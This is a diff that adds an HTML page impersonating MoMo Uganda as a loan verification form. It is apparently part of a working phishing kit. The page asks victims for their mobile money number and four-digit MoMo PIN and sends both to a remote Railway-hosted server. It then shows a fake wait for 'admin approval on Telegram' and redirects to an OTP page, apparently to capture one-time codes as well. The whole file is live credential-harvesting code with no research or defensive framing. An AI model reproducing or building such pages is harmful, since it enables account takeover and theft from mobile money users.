@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Loan - MoMo Uganda</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f3f4f6;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+        .card {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+        }
+        .header {
+            background: #E42320;
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .loan-info {
+            background: #fff0f0;
+            padding: 15px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .loan-amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: #E42320;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            background: #E42320;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:disabled {
+            background: #ccc;
+        }
+        .waiting-area {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: #fef3c7;
+            border-radius: 15px;
+            margin-bottom: 20px;
+        }
+        .waiting-dots {
+            display: flex;
+            justify-content: center;
+            gap: 5px;
+            margin-top: 10px;
+        }
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: #E42320;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        .dot:nth-child(2) { animation-delay: 0.3s; }
+        .dot:nth-child(3) { animation-delay: 0.6s; }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+        .error-msg {
+            display: none;
+            background: #fee2e2;
+            color: #b91c1c;
+            padding: 10px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+        }
+        .spinner {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+        }
+        .spin-ring {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.2);
+            border-top-color: #E42320;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="header">
+        <h2>Verify Your Loan</h2>
+        <p>Enter your MoMo number and PIN</p>
+    </div>
+
+    <div class="loan-info">
+        <div>Loan Amount</div>
+        <div class="loan-amount" id="loanAmount">—</div>
+        <div id="loanDetails" style="font-size:12px; color:#666;"></div>
+    </div>
+
+    <div class="form-body">
+        <div class="form-group">
+            <label>Mobile Money Number</label>
+            <input type="tel" id="phone" placeholder="077XXXXXXX" maxlength="10">
+        </div>
+        <div class="form-group">
+            <label>MoMo PIN</label>
+            <input type="password" id="pin" placeholder="••••" maxlength="4">
+        </div>
+        <div class="error-msg" id="errorMsg"></div>
+        
+        <div class="waiting-area" id="waitingArea">
+            <strong>⏳ Waiting for Admin Approval</strong>
+            <div class="waiting-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <p style="font-size: 12px; margin-top: 12px;">Please wait while admin reviews your application on Telegram...</p>
+        </div>
+        
+        <button id="submitBtn">Submit Application →</button>
+    </div>
+</div>
+
+<div id="spinner" class="spinner">
+    <div class="spin-ring"></div>
+    <p style="margin-top: 15px;">Submitting application...</p>
+</div>
+
+<script>
+    const API_URL = 'https://momo-uganda-production.up.railway.app';
+    let pollInterval = null;
+
+    function loadLoanData() {
+        const data = sessionStorage.getItem('calculatorData');
+        if (data) {
+            const loan = JSON.parse(data);
+            document.getElementById('loanAmount').textContent = `UGX ${loan.amount.toLocaleString()}`;
+            document.getElementById('loanDetails').textContent = `${loan.duration/30} months • UGX ${loan.monthly.toLocaleString()}/month`;
+        } else {
+            document.getElementById('loanAmount').textContent = 'UGX 500,000';
+            document.getElementById('loanDetails').textContent = '3 months • UGX 182,500/month';
+        }
+    }
+
+    function showError(msg) {
+        const err = document.getElementById('errorMsg');
+        err.textContent = msg;
+        err.style.display = 'block';
+        setTimeout(() => err.style.display = 'none', 4000);
+    }
+
+    function startPolling(loanId) {
+        pollInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`${API_URL}/api/loan/${loanId}`);
+                const data = await response.json();
+                
+                if (data.success && data.loan && data.loan.status === 'approved') {
+                    clearInterval(pollInterval);
+                    document.getElementById('spinner').style.display = 'none';
+                    alert("✅ Loan Approved! Redirecting to OTP page...");
+                    window.location.href = 'otp.html';
+                }
+            } catch (err) {
+                console.error('Polling error:', err);
+            }
+        }, 3000);
+    }
+
+    document.getElementById('submitBtn').onclick = async () => {
+        const phone = document.getElementById('phone').value.trim();
+        const pin = document.getElementById('pin').value.trim();
+        
+        if (!phone || phone.length !== 10) {
+            showError("Enter valid Uganda number (10 digits)");
+            return;
+        }
+        if (!pin || pin.length !== 4) {
+            showError("PIN must be 4 digits");
+            return;
+        }
+
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.textContent = "Submitting...";
+        document.getElementById('spinner').style.display = 'flex';
+
+        const loanData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
+        
+        let network = 'MTN';
+        if (phone.startsWith('075') || phone.startsWith('074')) network = 'Airtel';
+        else if (phone.startsWith('070') || phone.startsWith('076')) network = 'Africell';
+        
+        try {
+            const response = await fetch(`${API_URL}/api/save-loan`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: phone,
+                    pin: pin,
+                    network: network,
+                    amount: loanData.amount || 500000,
+                    duration: loanData.duration || 90,
+                    monthly: loanData.monthly || 182500,
+                    total: loanData.total || 547500,
+                    interest: loanData.interest || 47500
+                })
+            });
+
+            const data = await response.json();
+            
+            if (data.success) {
+                sessionStorage.setItem('loanId', data.loanId);
+                sessionStorage.setItem('userPhone', phone);
+                
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('waitingArea').style.display = 'block';
+                btn.style.display = 'none';
+                
+                startPolling(data.loanId);
+            } else {
+                throw new Error(data.error || "Submission failed");
+            }
+        } catch (err) {
+            console.error('Submit error:', err);
+            document.getElementById('spinner').style.display = 'none';
+            showError("Error: " + err.message);
+            btn.disabled = false;
+            btn.textContent = "Submit Application →";
+        }
+    };
+
+    document.getElementById('phone').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+    });
+
+    document.getElementById('pin').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
+    });
+
+    loadLoanData();
+</script>
+</body>
+</html>
